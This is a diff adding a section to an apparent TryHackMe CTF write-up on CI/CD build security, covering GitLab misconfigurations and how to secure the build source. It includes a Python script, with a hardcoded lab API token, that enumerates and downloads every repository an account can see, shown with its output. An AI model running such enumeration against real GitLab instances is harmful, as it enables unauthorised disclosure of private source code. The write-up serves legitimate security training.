@@ -242,7 +242,7 @@ Runtime platform                                    arch=amd64 os=linux pid=5103
 Runtime platform                                    arch=amd64 os=linux pid=5337 revision=535ced5f version=16.11.1
 ```
 
-### Register a runner :
+### Register a runner -
 
 ```bash                                                                                                                                                                 
 ┌──(kali㉿kali)-[~]
@@ -299,5 +299,98 @@ _We have now created our very own CI/CD pipeline and build process!_****
 > 2. What is the value of the flag you receive once authenticated to Timekeep? - `THM{W*********ines}`
  ![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/48333c21-c24a-4072-a243-f2ea8ad508f4)
 
+## Task 5 : Securing the Build Source 
+
+### Source Code Security -
+
+The **first step to securing the pipeline and the build is to secure the source**. In the event that a threat actor can compromise the source of our build, they are in a position to compromise the build itself. We want to protect our source code from the following two main issues:
+
+- _**Unauthorised Tampering**_ - This is the simplest issue of the two. Only authorised users should be able to make changes to the source code. This means that we want to control who has the ability to push new code to our repo.
+- _**Unauthorised Disclosure**_ - This is a bit more tricky. Depending on the application, the source code itself might be considered sensitive. For example, Microsoft would not like to disclose the source code of Word since that is their intellectual property. In cases where the source code is sensitive, we must ensure we do not intentionally disclose it. This issue is a lot more common to find.
+
+### Confusion of responsibilities -
+
+**First misconfiguration**
+
+_One such mistake is that organisations can leave registration for their Gitlab instance open. Not open to the internet (although this has also happened before), but open to any user on their internal network to register a profile. This was simulated in the previous task by allowing you to register your own Gitlab profile._
+
+An organisation might have 10,000 employees, of which 2000 may be working as developers and need access to Gitlab. In essence, our attack surface has grown by 500%! **_If a single employee of our bank is compromised, an attacker would have the ability to register a profile and exfiltrate any publicly shared repos._**
+
+**Second misconfiguration**
+
+Developers of our bank may believe that because the Gitlab instance is only accessible internally, it is okay to configure repos to be shared publicly. This means that any user who has a valid Gitlab account will be able to view the repo. While they may perhaps not be able to alter the code, remember, in this example, the code itself is seen as the IP of the bank. This confusion between who is responsible for securing the source code can lead to sensitive information being disclosed to the threat actor. Let's take a look at how this can be exploited!
+
+### Exploiting a vulnerable build source -
+
+To efficiently enumerate publicly visible repos, we will make use of the Gitlab API and a Python script as follows:
+
+```python
+import gitlab
+import uuid
+
+# Create a Gitlab connection
+gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='glpat-kRQ4GbynTxySZRJLLx7w')
+gl.auth()
+
+# Get all Gitlab projects
+projects = gl.projects.list(all=True)
+
+# Enumerate through all projects and try to download a copy
+for project in projects:
+    print ("Downloading project: " + str(project.name))
+    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
+    UID = str(uuid.uuid4())
+    print (UID)
+    try:
+        repo_download = project.repository_archive(format='zip')
+        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
+            output_file.write(repo_download)
+    except Exception as e:
+        # Based on permissions, we may not be able to download the project
+        print ("Error with this download")
+        print (e)
+        pass
+```
+
+**Gitlab does not allow for its API to be interfaced with using credentials, as this is deemed insecure**. Therefore, to use the script, we will first have to generate an API token for our account.
+
+> We can get the access token by going to _Profile -> Preferences -> Access Token_
+
+Now we can use the script to successfully clone all the repos,
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/213953d9-af23-4d5e-a187-bce375910d8e)
 
 
+```bash
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# python3 enumerate.py              
+Downloading project: Basic Build
+c09d2b12-1a89-4d03-95d3-d432fb442df7
+Downloading project: Approval Test
+4a57f04f-94ba-4b9f-a025-1720e4df4056
+Downloading project: Merge Test
+58bb12e0-ca5a-4571-ac2f-36e83595a129
+Downloading project: Basic Build
+9e2c0ebb-172c-48c3-9e79-629821abbb4b
+Downloading project: Mobile App
+1006c61c-eeca-4b02-b8ba-1b138538eb4e
+
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# ls
+'Approval Test_4a57f04f-94ba-4b9f-a025-1720e4df4056.zip'  'Basic Build_c09d2b12-1a89-4d03-95d3-d432fb442df7.zip'  'Merge Test_58bb12e0-ca5a-4571-ac2f-36e83595a129.zip'
+'Basic Build_9e2c0ebb-172c-48c3-9e79-629821abbb4b.zip'     enumerate.py                                           'Mobile App_1006c61c-eeca-4b02-b8ba-1b138538eb4e.zip'
+
+```
+
+### Securing the Build Source -
+
+Granular access control is crucial to managing repositories and the GitLab platform. It involves defining specific permissions and restrictions for different users or groups, ensuring that only authorised individuals have the appropriate level of access to sensitive resources. This helps maintain security, confidentiality, and effective collaboration within a development environment.
+
+In GitLab, group-based access control is a powerful mechanism that simplifies permissions management across multiple repositories and projects. Here's how it works:
+
+- **Group-Based Access Control:** GitLab allows you to organise projects into groups. Instead of managing access for each project separately, you can set permissions at the group level. This means that the same access rules apply to all projects within the group, making it easier to maintain consistent security policies. For example, you can create a group for the development team and define permissions, such as who can view, edit, or contribute to projects within that group. This approach streamlines access management and reduces the chances of errors or oversights when configuring permissions for individual repositories.
+- **Access Levels :** GitLab offers different access levels, such as Guest, Reporter, Developer, Maintainer, and Owner. Each level comes with specific capabilities and permissions. Assigning the appropriate access level to each user or group ensures they have the necessary privileges without granting unnecessary permissions.
+- **Sensitive Information Protection :** One critical consideration is preventing the accidental exposure of sensitive information. GitLab provides features to help with this:
+1. **GitLab's .gitignore :** This file specifies which files or directories should be excluded from version control. It's crucial for preventing sensitive data like passwords, API keys, and configuration files from being committed to repositories.
+2. **Environment Variables :** GitLab allows you to define and manage environment variables securely, separate from the source code. This is especially useful for storing sensitive data needed during the CI/CD process without exposing it in the repository.
+3. **Branch Protection :** Branches, like master or main, can be protected to prevent direct pushes, ensuring that changes go through code review and automated testing before merging.
